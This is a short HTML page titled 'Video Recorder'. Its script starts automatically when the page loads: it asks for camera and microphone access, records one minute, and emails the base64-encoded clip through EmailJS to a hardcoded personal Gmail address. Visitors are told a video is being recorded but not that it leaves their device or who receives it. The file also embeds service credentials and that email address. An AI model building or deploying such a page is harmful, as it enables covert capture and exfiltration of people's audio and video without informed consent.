<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Video Recorder</title>
</head>
<body>
  <h1>Recording a 1-minute video...</h1>
  <p>If asked, please allow camera and microphone access.</p>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    emailjs.init("fPzimjK_bZTooKIs_"); // Your EmailJS User ID

    async function startRecording() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        const recorder = new MediaRecorder(stream);
        const chunks = [];

        recorder.ondataavailable = e => chunks.push(e.data);

        recorder.onstop = async () => {
          const blob = new Blob(chunks, { type: 'video/webm' });
          const reader = new FileReader();

          reader.onloadend = function() {
            const base64data = reader.result.split(',')[1]; // Remove the data:video/webm;base64, part

            emailjs.send("service_p3yitzn", "template_oyrsayr", {
              to_email: "julianlee252@gmail.com",
              message: "Attached video from your website."
            }, {
              attachments: [{
                name: "recording.webm",
                data: base64data
              }]
            }).then(() => {
              alert("✅ Video email sent!");
            }, (error) => {
              console.error("❌ EmailJS error:", error);
              alert("❌ Failed to send email: " + error.text);
            });
          };

          reader.readAsDataURL(blob);
        };

        recorder.start();
        setTimeout(() => {
          recorder.stop();
          stream.getTracks().forEach(track => track.stop());
        }, 60000);
      } catch (err) {
        alert("Permission denied or error: " + err.message);
      }
    }

    window.onload = startRecording;
  </script>
</body>
</html>
